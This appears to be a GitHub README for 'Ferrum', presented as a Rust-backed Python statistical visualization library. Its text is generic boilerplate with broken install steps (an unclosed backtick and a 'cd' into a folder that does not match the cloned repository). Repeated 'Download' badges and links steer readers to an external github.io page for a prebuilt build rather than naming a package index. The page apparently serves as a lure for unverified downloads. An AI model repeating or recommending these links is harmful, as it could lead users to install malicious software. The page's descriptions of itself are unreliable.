# Ferrum v2026 - statistical visualization library 2026

> **Ferrum is a Python library for statistical visualization that combines grammar-driven plotting, interactive data investigation, and model diagnostics in a Rust-backed engine. This release targets 2026.**

[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/evanxysdlewis9953/ferrum-model-diagnostics?style=flat-square)](https://github.com/evanxysdlewis9953/ferrum-model-diagnostics)

---

<p align="center">
  <a href="https://evanxysdlewis9953.github.io/ferrum-model-diagnostics/">
    <img src="https://img.shields.io/badge/Download-Ferrum%20Latest-brightgreen?style=for-the-badge" alt="Download Ferrum">
  </a>
</p>

> **[Download Ferrum v2026](https://evanxysdlewis9953.github.io/ferrum-model-diagnostics/)**

---

[Download Latest Build](https://evanxysdlewis9953.github.io/ferrum-model-diagnostics/)

---

## Overview

Ferrum gives Python users a structured way to create statistical graphics while retaining an interactive workflow. Its API follows a grammar-of-graphics approach, allowing plots to be assembled from reusable layers and operators rather than created as isolated, one-off figures.

The library is intended for exploratory work, machine learning analysis, and reports developed in notebooks. Rust handles computation beneath the Python interface, while Jupyter-compatible rendering supports responsive visual investigation across multiple dataframe ecosystems.

---

## Highlights

- Build visualizations through a composable, grammar-first plotting model
- Use a Rust computation core made available to Python through PyO3
- Create statistical views such as scatter plots, histograms, ROC curves, SHAP beeswarm plots, and other related graphics
- Explore charts interactively in Jupyter with zooming, panning, selection, linked views, and tooltips
- Combine encodings and visual layers with chart composition operators
- Work with polars, pandas, modin, cuDF, dask, ibis, and pyarrow
- Render without additional system dependencies
- Use included model-diagnostic visualizers and theme presets

---

## Getting Started

Obtain the repository or project files, install Ferrum in your Python environment, and then import it from Python or a notebook.

1. Clone the source repository:

   - `git clone https://github.com/evanxysdlewis9953/ferrum-model-diagnostics.git
   - `cd ferrum`

2. Install the package using the Python installation method that fits your workflow.

3. Open Python or Jupyter and import Ferrum before creating charts.

For a quick import check:

- `python -c "import ferrum"`

Notebook users can start Jupyter and display rendered charts directly within cells.

---

## Working with Ferrum

Ferrum's workflow revolves around defining charts, combining layers, and examining the rendered result interactively.

A typical session looks like this:

1. Read data through one of the supported dataframe libraries.
2. Create a chart using the grammar-first interface.
3. Add marks, encodings, and additional layers.
4. Render the visualization from Python or in Jupyter.
5. Investigate the data with tools such as zoom, pan, tooltips, and linked selections.

Ferrum can be used for tasks including:

- exploring statistical relationships
- examining distributions
- evaluating classification behavior
- studying feature relationships
- viewing model explanations

Support for multiple dataframe engines makes it possible to add Ferrum to existing analysis pipelines without replacing the rest of the data stack.

---

## Settings and Customization

Configuration is generally expressed through Python code, chart construction, and the environment in which a notebook runs.

For example:

    import ferrum

    # Apply chart/theme choices in code
    # Build and render plots in your notebook or script

Theme and other presets can be chosen as part of the plotting process. Runtime behavior depends on the package entry points and the notebook environment used with Ferrum.

---

## Requirements

- A Python environment
- A compatible dataframe library, including pandas, polars, modin, cuDF, dask, ibis, or pyarrow
- Jupyter for interactive notebook-based rendering
- No additional system rendering dependencies are needed for visual output

---

## Frequently Asked Questions

**Can Ferrum be used without Jupyter?**  
Yes. Ferrum is a Python library and works in ordinary Python workflows, although Jupyter provides the most extensive interactive experience.

**Which visualizations are available?**  
The library provides statistical graphics such as scatter plots, histograms, ROC curves, SHAP beeswarm views, and other diagnostic visualizations.

**Does Ferrum support the dataframe tools I already use?**  
It supports a range of dataframe ecosystems, including pandas, polars, modin, cuDF, dask, ibis, and pyarrow.

**How do I control a chart's appearance and structure?**  
Use chart operators, layers, encodings, and theme presets to describe the visualization directly in code.

**How can I find the newest version?**  
Check the latest repository release or use the download link above for the current build.

**What if a chart does not render correctly?**  
Verify that the Python environment has a supported dataframe backend. For interactive results, also check that Jupyter is operating correctly.

---

## License

Ferrum is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for the complete terms.
